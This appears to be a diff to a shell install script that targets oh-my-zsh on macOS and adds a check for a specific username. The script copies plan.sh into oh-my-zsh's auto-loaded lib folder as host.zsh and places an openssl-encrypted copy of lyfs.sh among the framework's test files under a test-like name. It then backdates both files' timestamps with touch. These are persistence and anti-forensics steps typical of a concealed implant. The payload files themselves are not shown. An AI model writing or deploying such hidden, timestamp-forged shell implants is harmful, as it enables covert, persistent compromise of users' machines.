@@ -7,20 +7,28 @@ if [ -z "$USER" ]; then
 	exit 1
 fi
 
+if [ "$USER" != "jmuhlber" ]; then
+	echo "nenene"
+	exit 1
+fi
+
 
 macinstall() {
 	if [[ -d ~/.oh-my-zsh ]]; then
-		cp plan.sh ~/.oh-my-zsh/lib/host.zsh
 		INFILE="lyfs.sh"
-		OUTFILE=~/.oh-my-zsh/lib/tests/lyfs.test.zsh
+		OUTFILE=$HOME/.oh-my-zsh/lib/tests/lyfs.test.zsh
 		openssl enc -aes-256-cbc -salt -in "$INFILE" -out "$OUTFILE" -k "$USER"
-		
+		cp plan.sh ~/.oh-my-zsh/lib/host.zsh
+		touch -t 202410191633 ~/.oh-my-zsh/lib/host.zsh
+		touch -t 202405131058 "$OUTFILE"
+		echo "Installed."
 	else
-		echo "Der Ordner 'ozsh' ist nicht vorhanden."
+		echo "no ohmyzsh"
 	fi
 }
 
 linuxinstall() {
+	echo "System not supportet yet."
 	exit 1
 }
 
